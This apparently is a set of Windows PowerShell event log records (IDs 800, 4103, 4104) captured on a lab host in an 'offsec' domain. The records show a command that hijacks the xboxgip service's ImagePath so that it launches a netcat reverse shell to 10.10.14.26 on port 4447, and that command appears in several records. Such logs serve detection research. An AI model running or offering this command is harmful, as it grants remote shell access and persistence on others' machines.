{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"PowerShell"},"EventID_attributes":{"Qualifiers":0},"EventID":800,"Version":0,"Level":4,"Task":8,"Opcode":0,"Keywords":"0x80000000000000","TimeCreated_attributes":{"SystemTime":"2021-10-07T18:21:36.860523Z"},"EventRecordID":1172261,"Correlation":null,"Execution_attributes":{"ProcessID":0,"ThreadID":0},"Channel":"Windows PowerShell","Computer":"win10-02.offsec.lan","Security":null},"EventData":{"Data":{"#text":["","\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=2346\r\n\r\n\tUserId=OFFSEC\\admmig\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1237\r\n\tHostId=cd8cafb9-7c03-4e5e-9d54-914780550df1\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1237\r\n\tRunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b\r\n\tPipelineId=173\r\n\tScriptName=\r\n\tCommandLine=","CommandInvocation(PSConsoleHostReadLine): \"PSConsoleHostReadLine\"\r\n"]},"Binary":null}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4103,"Version":1,"Level":4,"Task":106,"Opcode":20,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-07T18:21:36.864698Z"},"EventRecordID":1341591,"Correlation_attributes":{"ActivityID":"82305249-B6DD-0000-7215-5B82DDB6D701"},"Execution_attributes":{"ProcessID":1636,"ThreadID":9868},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.1237\r\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n        Engine Version = 5.1.19041.1237\r\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\r\n        Pipeline ID = 173\r\n        Command Name = PSConsoleHostReadLine\r\n        Command Type = Function\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 2347\r\n        User = OFFSEC\\admmig\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","UserData":"","Payload":"CommandInvocation(PSConsoleHostReadLine): \"PSConsoleHostReadLine\"\r\n"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-07T18:21:36.889776Z"},"EventRecordID":1341592,"Correlation_attributes":{"ActivityID":"82305249-B6DD-0001-EF2C-5882DDB6D701"},"Execution_attributes":{"ProcessID":1636,"ThreadID":9868},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-ItemProperty -path HKLM:\\System\\CurrentControlSet\\services\\xboxgip -name ImagePath -value \"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\"","ScriptBlockId":"e3b09c38-03f2-4932-b5a6-737f7bcca7cc","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"PowerShell"},"EventID_attributes":{"Qualifiers":0},"EventID":800,"Version":0,"Level":4,"Task":8,"Opcode":0,"Keywords":"0x80000000000000","TimeCreated_attributes":{"SystemTime":"2021-10-07T18:21:37.133768Z"},"EventRecordID":1172262,"Correlation":null,"Execution_attributes":{"ProcessID":0,"ThreadID":0},"Channel":"Windows PowerShell","Computer":"win10-02.offsec.lan","Security":null},"EventData":{"Data":{"#text":["Set-ItemProperty -path HKLM:\\System\\CurrentControlSet\\services\\xboxgip -name ImagePath -value \"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\"","\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=2352\r\n\r\n\tUserId=OFFSEC\\admmig\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1237\r\n\tHostId=cd8cafb9-7c03-4e5e-9d54-914780550df1\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1237\r\n\tRunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b\r\n\tPipelineId=174\r\n\tScriptName=\r\n\tCommandLine=Set-ItemProperty -path HKLM:\\System\\CurrentControlSet\\services\\xboxgip -name ImagePath -value \"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\"","CommandInvocation(Set-ItemProperty): \"Set-ItemProperty\"\r\nParameterBinding(Set-ItemProperty): name=\"Path\"; value=\"HKLM:\\System\\CurrentControlSet\\services\\xboxgip\"\r\nParameterBinding(Set-ItemProperty): name=\"Name\"; value=\"ImagePath\"\r\nParameterBinding(Set-ItemProperty): name=\"Value\"; value=\"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\"\r\n"]},"Binary":null}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"PowerShell"},"EventID_attributes":{"Qualifiers":0},"EventID":800,"Version":0,"Level":4,"Task":8,"Opcode":0,"Keywords":"0x80000000000000","TimeCreated_attributes":{"SystemTime":"2021-10-07T18:21:37.133768Z"},"EventRecordID":1172263,"Correlation":null,"Execution_attributes":{"ProcessID":0,"ThreadID":0},"Channel":"Windows PowerShell","Computer":"win10-02.offsec.lan","Security":null},"EventData":{"Data":{"#text":["","\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=2356\r\n\r\n\tUserId=OFFSEC\\admmig\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1237\r\n\tHostId=cd8cafb9-7c03-4e5e-9d54-914780550df1\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1237\r\n\tRunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b\r\n\tPipelineId=174\r\n\tScriptName=\r\n\tCommandLine=","CommandInvocation(Out-Default): \"Out-Default\"\r\n"]},"Binary":null}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4103,"Version":1,"Level":4,"Task":106,"Opcode":20,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-07T18:21:37.136101Z"},"EventRecordID":1341593,"Correlation_attributes":{"ActivityID":"82305249-B6DD-0000-8621-5B82DDB6D701"},"Execution_attributes":{"ProcessID":1636,"ThreadID":9868},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.1237\r\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n        Engine Version = 5.1.19041.1237\r\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\r\n        Pipeline ID = 174\r\n        Command Name = Set-ItemProperty\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 2353\r\n        User = OFFSEC\\admmig\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","UserData":"","Payload":"CommandInvocation(Set-ItemProperty): \"Set-ItemProperty\"\r\nParameterBinding(Set-ItemProperty): name=\"Path\"; value=\"HKLM:\\System\\CurrentControlSet\\services\\xboxgip\"\r\nParameterBinding(Set-ItemProperty): name=\"Name\"; value=\"ImagePath\"\r\nParameterBinding(Set-ItemProperty): name=\"Value\"; value=\"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\"\r\n"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4103,"Version":1,"Level":4,"Task":106,"Opcode":20,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-07T18:21:37.137877Z"},"EventRecordID":1341594,"Correlation_attributes":{"ActivityID":"82305249-B6DD-0001-EF2C-5882DDB6D701"},"Execution_attributes":{"ProcessID":1636,"ThreadID":9868},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.1237\r\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n        Engine Version = 5.1.19041.1237\r\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\r\n        Pipeline ID = 174\r\n        Command Name = \r\n        Command Type = Script\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 2357\r\n        User = OFFSEC\\admmig\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","UserData":"","Payload":"CommandInvocation(Out-Default): \"Out-Default\"\r\n"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"PowerShell"},"EventID_attributes":{"Qualifiers":0},"EventID":800,"Version":0,"Level":4,"Task":8,"Opcode":0,"Keywords":"0x80000000000000","TimeCreated_attributes":{"SystemTime":"2021-10-07T18:21:37.141774Z"},"EventRecordID":1172264,"Correlation":null,"Execution_attributes":{"ProcessID":0,"ThreadID":0},"Channel":"Windows PowerShell","Computer":"win10-02.offsec.lan","Security":null},"EventData":{"Data":{"#text":["    Microsoft.PowerShell.Core\\Set-StrictMode -Off\n","\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=2371\r\n\r\n\tUserId=OFFSEC\\admmig\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1237\r\n\tHostId=cd8cafb9-7c03-4e5e-9d54-914780550df1\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1237\r\n\tRunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b\r\n\tPipelineId=176\r\n\tScriptName=C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\PSReadLine.psm1\r\n\tCommandLine=    Microsoft.PowerShell.Core\\Set-StrictMode -Off\n","CommandInvocation(Set-StrictMode): \"Set-StrictMode\"\r\nParameterBinding(Set-StrictMode): name=\"Off\"; value=\"True\"\r\n"]},"Binary":null}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-07T18:21:37.143881Z"},"EventRecordID":1341595,"Correlation_attributes":{"ActivityID":"82305249-B6DD-0000-8821-5B82DDB6D701"},"Execution_attributes":{"ProcessID":1636,"ThreadID":9868},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"prompt","ScriptBlockId":"604661d0-5757-4d50-8024-6d3a16ebe5ce","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4103,"Version":1,"Level":4,"Task":106,"Opcode":20,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-10-07T18:21:37.146686Z"},"EventRecordID":1341596,"Correlation_attributes":{"ActivityID":"82305249-B6DD-0000-8D21-5B82DDB6D701"},"Execution_attributes":{"ProcessID":1636,"ThreadID":9868},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.1237\r\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n        Engine Version = 5.1.19041.1237\r\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\r\n        Pipeline ID = 176\r\n        Command Name = Set-StrictMode\r\n        Command Type = Cmdlet\r\n        Script Name = C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\PSReadLine.psm1\r\n        Command Path = \r\n        Sequence Number = 2372\r\n        User = OFFSEC\\admmig\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","UserData":"","Payload":"CommandInvocation(Set-StrictMode): \"Set-StrictMode\"\r\nParameterBinding(Set-StrictMode): name=\"Off\"; value=\"True\"\r\n"}}}
